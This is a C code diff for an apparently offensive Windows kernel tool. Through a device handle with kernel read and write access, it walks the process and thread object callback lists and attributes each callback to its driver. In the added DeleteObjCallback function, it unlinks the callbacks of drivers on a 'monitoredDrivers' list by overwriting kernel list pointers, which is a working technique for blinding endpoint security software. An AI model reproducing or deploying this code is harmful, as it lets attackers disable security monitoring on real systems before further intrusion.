@@ -272,8 +272,15 @@ VOID ListObjCallback(HANDLE hDevice) {
 	DWORD64 internalOffset = EzPdbGetStructPropertyOffset(&pdb, "_OBJECT_TYPE", L"CallbackList");
 
 
-	DWORD64 procListHead = (DWORD64)ntoskrnlBase + procCallbackListHead + internalOffset;
-	DWORD64 threadListHead = (DWORD64)ntoskrnlBase + threadCallbackListHead + internalOffset;
+	DWORD64 procListHead = (DWORD64)ntoskrnlBase + procCallbackListHead;
+	DWORD64 threadListHead = (DWORD64)ntoskrnlBase + threadCallbackListHead;
+
+
+	procListHead = Read64(hDevice, procListHead);
+	threadListHead = Read64(hDevice, threadListHead);
+
+	procListHead += internalOffset;
+	threadListHead += internalOffset;
 
 	printf("procCallBackListHead at address: %llx\n", procListHead);
 	printf("procCallBackListHead at address: %llx\n", threadListHead);
@@ -284,26 +291,26 @@ VOID ListObjCallback(HANDLE hDevice) {
 	DWORD64 moduleFuncAddr;
 
 	DWORD64 currListEntry = procListHead;
-	BYTE* entry = (BYTE*)malloc(sizeof(REGISTRY_CALLBACK_ITEM));
-	REGISTRY_CALLBACK_ITEM* castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+	BYTE* entry = (BYTE*)malloc(sizeof(OB_CALLBACK_ENTRY));
+	OB_CALLBACK_ENTRY* castedEntry = (OB_CALLBACK_ENTRY*)entry;
 
 	int i = 0;
 	for (size_t i = 0; i < max_entries; i++) {
 		
-		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
-		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;
+		ReadN(hDevice, currListEntry, sizeof(OB_CALLBACK_ENTRY), entry);
+		castedEntry = (OB_CALLBACK_ENTRY*)entry;
 
 
-		printf("currListEntry: flink  0x%llx\n", castedEntry->Item.Flink);
-		printf("currListEntry: blink  0x%llx\n", castedEntry->Item.Blink);
-		printf("currListEntry: Context  0x%llx\n", castedEntry->Context);
-		printf("currListEntry: Function  0x%llx\n", castedEntry->Function);
+		//printf("currListEntry: flink  0x%llx\n", castedEntry->CallbackList.Flink);
+		//printf("currListEntry: blink  0x%llx\n", castedEntry->CallbackList.Blink);
+		//printf("currListEntry: PreOperation  0x%llx\n", castedEntry->PreOperation);
+		//printf("currListEntry: PostOperation  0x%llx\n\n", castedEntry->PostOperation);
 	
-		if (castedEntry->Function) {
-			moduleFuncAddr = castedEntry->Function;
+		if (castedEntry->PreOperation) {
+			moduleFuncAddr = castedEntry->PreOperation;
 		}
-		else if (castedEntry->Context) {
-			moduleFuncAddr = castedEntry->Context;
+		else if (castedEntry->PostOperation) {
+			moduleFuncAddr = castedEntry->PostOperation;
 		}
 		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
 		SearchModule(moduleFuncAddr, &moduleInfo);
@@ -312,8 +319,8 @@ VOID ListObjCallback(HANDLE hDevice) {
 			printf("Found obj callback by: %s\n", moduleInfo.moduleName);
 		}
 
-		currListEntry = (DWORD64)castedEntry->Item.Flink;
-		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;
+		currListEntry = (DWORD64)castedEntry->CallbackList.Flink;
+		castedEntry = (OB_CALLBACK_ENTRY*)castedEntry->CallbackList.Flink;
 
 
 		if ((DWORD64)currListEntry == procListHead) {
@@ -527,6 +534,94 @@ VOID DeleteRegCallback(HANDLE hDevice) {
 
 
 		if ((DWORD64)currListEntry == listHead) {
+			break;
+		}
+
+	}
+	free(entry);
+}
+
+VOID DeleteObjCallback(HANDLE hDevice) {
+	int max_entries = 64;
+	DWORD64 procCallbackListHead = EzPdbGetRva(&pdb, "PsProcessType");
+	DWORD64 threadCallbackListHead = EzPdbGetRva(&pdb, "PsThreadType");
+
+	DWORD64 internalOffset = EzPdbGetStructPropertyOffset(&pdb, "_OBJECT_TYPE", L"CallbackList");
+
+
+	DWORD64 procListHead = (DWORD64)ntoskrnlBase + procCallbackListHead;
+	DWORD64 threadListHead = (DWORD64)ntoskrnlBase + threadCallbackListHead;
+
+
+	procListHead = Read64(hDevice, procListHead);
+	threadListHead = Read64(hDevice, threadListHead);
+
+	procListHead += internalOffset;
+	threadListHead += internalOffset;
+
+	printf("procCallBackListHead at address: %llx\n", procListHead);
+	printf("procCallBackListHead at address: %llx\n", threadListHead);
+
+	printf("Press any key to continue\n");
+	getchar();
+	ModulesData moduleInfo = { 0 };
+	DWORD64 moduleFuncAddr;
+
+	DWORD64 currListEntry = procListHead;
+	BYTE* entry = (BYTE*)malloc(sizeof(OB_CALLBACK_ENTRY));
+	OB_CALLBACK_ENTRY* castedEntry = (OB_CALLBACK_ENTRY*)entry;
+
+	int i = 0;
+	for (size_t i = 0; i < max_entries; i++) {
+
+		ReadN(hDevice, currListEntry, sizeof(OB_CALLBACK_ENTRY), entry);
+		castedEntry = (OB_CALLBACK_ENTRY*)entry;
+
+
+		//printf("currListEntry: flink  0x%llx\n", castedEntry->CallbackList.Flink);
+		//printf("currListEntry: blink  0x%llx\n", castedEntry->CallbackList.Blink);
+		//printf("currListEntry: PreOperation  0x%llx\n", castedEntry->PreOperation);
+		//printf("currListEntry: PostOperation  0x%llx\n\n", castedEntry->PostOperation);
+
+		if (castedEntry->PreOperation) {
+			moduleFuncAddr = castedEntry->PreOperation;
+		}
+		else if (castedEntry->PostOperation) {
+			moduleFuncAddr = castedEntry->PostOperation;
+		}
+		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
+		SearchModule(moduleFuncAddr, &moduleInfo);
+
+		if (moduleInfo.moduleBase) {
+			printf("Found obj callback by: %s\n", moduleInfo.moduleName);
+			for (size_t k = 0; k < 104; k++) {
+				if (_strcmpi(moduleInfo.moduleName, monitoredDrivers[k]) == 0) {
+					printf("Deleting reg callback entry for: %s\n", moduleInfo.moduleName);
+					DWORD64 addr1 = (DWORD64)castedEntry->CallbackList.Blink;
+					DWORD64 addr2 = (DWORD64)castedEntry->CallbackList.Flink + 0x8; // blink
+
+
+					DWORD64 addrmio1 = currListEntry;
+					DWORD64 addrmio2 = currListEntry + 0x8;
+
+					// unlinko
+					Write64(hDevice, addr1, (DWORD64)castedEntry->CallbackList.Flink);
+					Write64(hDevice, addr2, (DWORD64)castedEntry->CallbackList.Blink);
+
+					//sovrascrivo quelli nella mia struct
+					Write64(hDevice, addrmio1, (DWORD64)currListEntry);
+					Write64(hDevice, addrmio2, (DWORD64)currListEntry);
+
+
+				}
+			}
+		}
+
+		currListEntry = (DWORD64)castedEntry->CallbackList.Flink;
+		castedEntry = (OB_CALLBACK_ENTRY*)castedEntry->CallbackList.Flink;
+
+
+		if ((DWORD64)currListEntry == procListHead) {
 			break;
 		}
 
